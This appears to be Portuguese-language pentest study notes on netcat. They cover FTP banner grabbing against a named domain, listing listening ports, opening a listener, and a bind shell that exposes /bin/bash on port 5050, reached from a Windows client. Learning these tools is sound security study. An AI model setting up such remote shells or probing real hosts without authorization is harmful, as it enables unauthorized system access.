
Voce sempre deve usalo com um dominio e a porta que voce quer estabelecer uma conexao, ou tambem pode utilizar o endereco IP e a porta.

```
└─$ nc businesscorp.com.br 21
220 ProFTPD 1.3.4a Server (FTP) [::ffff:37.59.174.225]
help
214-The following commands are recognized (* =>'s unimplemented):
 CWD     XCWD    CDUP    XCUP    SMNT*   QUIT    PORT    PASV    
 EPRT    EPSV    ALLO*   RNFR    RNTO    DELE    MDTM    RMD     
 XRMD    MKD     XMKD    PWD     XPWD    SIZE    SYST    HELP    
 NOOP    FEAT    OPTS    AUTH*   CCC*    CONF*   ENC*    MIC*    
 PBSZ*   PROT*   TYPE    STRU    MODE    RETR    STOR    STOU    
 APPE    REST    ABOR    USER    PASS    ACCT*   REIN*   LIST    
 NLST    STAT    SITE    MLSD    MLST    
214 Direct comments to root@ns1.businesscorp.com.br.
```

- Verificacao de servicos abertos 

```
└─$ netstat -lntp        
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
```

- Abrir uma porta na sua maquina (utilizando o netcat)

```
└─$ nc -vlp 3333
listening on [any] 3333 ...

└─$ netstat -lntp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:3333            0.0.0.0:*               LISTEN      19894/nc            
```

- Bind Shell

Consiste em voce abrir uma porta utilizando o camando do NetCat, passando o diretorio **/bin/bash** 
```
└─$ nc -vnlp 5050 -e /bin/bash
listening on [any] 5050 ...
```

E no Windows voce tem a capacidade de acessar o diretorio **/bin/bash** 
```
PS C:\Users\arnal\Downloads> .\nc.exe -vn 192.168.1.20 5050
(UNKNOWN) [192.168.1.20] 5050 (?) open
pwd
/home/a71rnaldin
```

